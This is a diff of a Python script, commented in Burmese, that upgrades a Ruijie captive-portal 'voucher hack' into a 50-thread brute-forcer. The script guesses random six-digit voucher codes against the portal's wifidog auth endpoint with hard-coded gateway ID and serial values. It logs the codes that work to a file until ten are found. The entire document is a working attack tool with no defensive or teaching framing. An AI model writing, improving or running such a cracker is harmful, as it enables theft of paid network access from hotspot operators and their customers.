@@ -1,59 +1,61 @@
 import sys, os, hashlib, requests, time, random
+from concurrent.futures import ThreadPoolExecutor
 from colorama import Fore, init
 
 init(autoreset=True)
 
-# Canary ထဲက ရထားတဲ့ တည်ငြိမ်တဲ့ အချက်အလက်များ
+# Canary Data
 TARGET_IP = "192.168.110.1"
 GW_ID = "58b4bbd9c1e9"
 GW_SN = "H1U42FJ004707"
 
-def crack_voucher():
-    print(f"{Fore.CYAN}[*] Ruijie Voucher Cracker စတင်နေပြီ...")
+FOUND_VOUCHERS = []
+MAX_VOUCHERS = 10
+
+def check_voucher(v):
+    global FOUND_VOUCHERS
+    if len(FOUND_VOUCHERS) >= MAX_VOUCHERS:
+        return
+
+    url = f"http://{TARGET_IP}:2060/wifidog/auth"
+    params = {"token": v, "gw_id": GW_ID, "gw_sn": GW_SN}
     
-    with requests.Session() as s:
-        s.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10; K)"})
+    try:
+        # Timeout ကို တိုတိုထားပြီး မြန်မြန်စစ်မယ်
+        res = requests.get(url, params=params, timeout=1.5)
         
-        # Voucher Code တွေကို တစ်ခုပြီးတစ်ခု စမ်းမယ်
-        # အချိန်မကုန်ရအောင် Random နဲ့ အရင်စမ်းတဲ့ logic သုံးထားတယ်
-        while True:
-            # ဂဏန်း ၆ လုံး Voucher Code ထုတ်မယ်
-            voucher = str(random.randint(100000, 999999))
+        # Testing status ကို မြင်ရအောင်
+        sys.stdout.write(f"\r{Fore.WHITE}[-] Scanning: {Fore.YELLOW}{v} {Fore.CYAN}(Found: {len(FOUND_VOUCHERS)})")
+        sys.stdout.flush()
+
+        if "success" in res.text.lower() or res.status_code == 302:
+            if v not in FOUND_VOUCHERS:
+                FOUND_VOUCHERS.append(v)
+                print(f"\n{Fore.GREEN}[✔] VOUCHER {len(FOUND_VOUCHERS)} FOUND: {v}")
+                # ဖိုင်ထဲမှာ သိမ်းထားမယ်
+                with open("found_vouchers.txt", "a") as f:
+                    f.write(f"{v}\n")
+    except:
+        pass
+
+def start_cracking():
+    print(f"{Fore.MAGENTA}========================================")
+    print(f"{Fore.WHITE}   RUIJIE ULTRA-FAST CRACKER (THREADED)")
+    print(f"{Fore.MAGENTA}========================================")
+    
+    # Thread 50 ခွဲပြီး တစ်ပြိုင်တည်း ပစ်မယ် (ဖုန်းမဟန်းအောင် ဒီလောက်ပဲ ထားတာ အကောင်းဆုံးပါ)
+    with ThreadPoolExecutor(max_workers=50) as executor:
+        while len(FOUND_VOUCHERS) < MAX_VOUCHERS:
+            # Random ဂဏန်း ၆ လုံး ထုတ်မယ်
+            v_list = [str(random.randint(100000, 999999)) for _ in range(100)]
+            executor.map(check_voucher, v_list)
             
-            try:
-                auth_url = f"http://{TARGET_IP}:2060/wifidog/auth"
-                params = {
-                    "token": voucher, # Voucher ကို Token နေရာမှာ သုံးလေ့ရှိတယ်
-                    "phoneNumber": voucher, # တချို့က phone နေရာမှာ စစ်တယ်
-                    "gw_id": GW_ID,
-                    "gw_sn": GW_SN
-                }
-                
-                # Router ဆီ ပစ်သွင်းမယ်
-                res = s.get(auth_url, params=params, timeout=2)
-                
-                # အောင်မြင်ရင် များသောအားဖြင့် 302 Redirect ဒါမှမဟုတ် Success စာသား ပြတယ်
-                if res.status_code == 302 or "success" in res.text.lower():
-                    print(f"\n{Fore.GREEN}[✔] VOUCHER FOUND: {voucher}")
-                    print(f"{Fore.YELLOW}[!] အင်တာနက် ပွင့်သွားပါပြီ။")
-                    break
-                else:
-                    # စမ်းသပ်နေတာကို မြင်ရအောင် တစ်ကြောင်းတည်းမှာ ပြမယ်
-                    sys.stdout.write(f"\r{Fore.WHITE}[-] Testing: {voucher} (Failed)")
-                    sys.stdout.flush()
-            
-            except:
-                print(f"\n{Fore.RED}[!] Connection Lost. Retrying...")
-                time.sleep(2)
+    print(f"\n\n{Fore.YELLOW}🎉 TASK COMPLETE: {MAX_VOUCHERS} VOUCHERS FOUND!")
+    print(f"{Fore.GREEN}Check 'found_vouchers.txt' for the list.")
 
 if __name__ == "__main__":
     os.system('clear')
-    print(f"{Fore.MAGENTA}========================================")
-    print(f"{Fore.WHITE}      RUIJIE 6-DIGIT VOUCHER HACK")
-    print(f"{Fore.MAGENTA}========================================")
-    
-    # WiFi ချိတ်ထားလား အရင်စစ်မယ်
     try:
-        crack_voucher()
+        start_cracking()
     except KeyboardInterrupt:
-        print(f"\n{Fore.YELLOW}[!] Stopped by User.")
+        print(f"\n{Fore.RED}[!] Paused by User.")
